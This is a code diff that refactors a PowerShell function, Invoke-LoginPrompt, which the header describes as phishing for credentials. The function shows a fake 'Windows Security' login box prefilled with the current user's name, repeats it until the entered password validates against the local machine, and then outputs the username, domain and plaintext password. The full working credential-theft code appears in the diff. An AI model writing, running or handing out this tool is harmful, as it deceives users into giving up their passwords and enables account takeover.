@@ -14,19 +14,17 @@ This script will pop a Windows Authentication box and ask the user for credentia
 http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
 #>
 
-function Invoke-LoginPrompt{
+Function Invoke-LoginPrompt{
+    Add-Type -assemblyname System.DirectoryServices.AccountManagement
+    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
     $InitialPrompt = "Please enter user credentials"
     $RetryPrompt = "Invalid credentials. Please try again"
-    do {
+    Do {
         $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), "$env:userdomain\$env:username","")
         $username = "$env:username"
         $domain = "$env:userdomain"
         $full = "$domain" + "\" + "$username"
         $password = $cred.GetNetworkCredential().password
-        Add-Type -assemblyname System.DirectoryServices.AccountManagement
-        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
-    } while($DS.ValidateCredentials("$full", "$password") -ne $True)
-    
-     $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
-     $output
+    } While($DS.ValidateCredentials("$full", "$password") -ne $True)
+    $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password
 }
